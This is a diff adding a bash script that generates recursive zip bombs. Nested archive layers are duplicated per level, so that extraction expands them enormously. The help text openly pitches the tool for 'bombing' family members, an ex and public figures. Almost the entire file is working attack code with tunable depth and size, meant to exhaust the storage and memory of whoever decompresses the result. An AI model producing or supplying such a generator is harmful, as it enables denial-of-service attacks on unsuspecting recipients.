@@ -1,0 +1,106 @@
+#! /bin/bash
+
+help()
+{
+cat << EOF
+help: $0 options
+
+use this classy tool to (zip)bomb the crap out of your mom, dad, ex, annoying sister, George Bush, Donald Trump, Bon Jovi, or ISIS
+
+OPTIONS:
+   -c		Compression algo (zip)
+   -d      	Depth (1)
+   -f		Number of files per layer (16)
+   -n		Number of sequences per file (512)
+   -s		Character sequence to store ("0")
+   -z		Name of zipbomb
+   
+Note: if any metadata option is not specified, 
+each option will be prompted every url
+EOF
+}
+
+name="zipbomb"
+comp_algo="zip"
+depth=1
+files=16
+n_seq=512
+seq="0"
+
+while getopts “hc:d:f:n:s:z:” OPTION
+do
+	case $OPTION in
+		h)
+			help
+			exit 1
+			;;
+		c)
+			comp_algo=$OPTARG
+			;;
+		d)
+			depth=$OPTARG
+			;;
+		f)
+			files=$OPTARG
+			;;
+		n)
+			n_seq=$OPTARG
+			;;
+		s)
+			seq=$OPTARG
+			;;
+		z)
+			name=$OPTARG
+			;;
+		*)
+			break
+			;;
+	esac
+done
+
+zipbomb_dir=/tmp/zipbomb
+
+mkdir "$zipbomb_dir"
+cd "$zipbomb_dir"
+
+zip_layer() {
+	level="$1"
+	
+	#bottom level
+	if [[ "$level" == 1 ]]; then
+		perl -E "print '$seq' x $n_seq" > "$zipbomb_dir"/0
+		
+		for i in $(seq 1 $(($files)))
+		do
+			cp "$zipbomb_dir"/0 "$zipbomb_dir"/"$i"
+		done
+
+		zip -qr "$name" ./*
+
+		for i in $(seq 0 $(($files)))
+		do
+			rm "$i"
+		done
+		
+	#above bottom level
+	else
+		
+		zip_layer $(($level-1))
+
+		mv "$name".zip "0.zip"
+		
+		for i in $(seq 1 $(($files)))
+		do
+			cp "0.zip" "$i".zip
+		done
+
+		zip -qr "$name" ./*
+
+		for i in $(seq 0 $(($files)))
+		do
+			rm "$i".zip
+		done
+	fi
+}
+
+zip_layer "$depth"
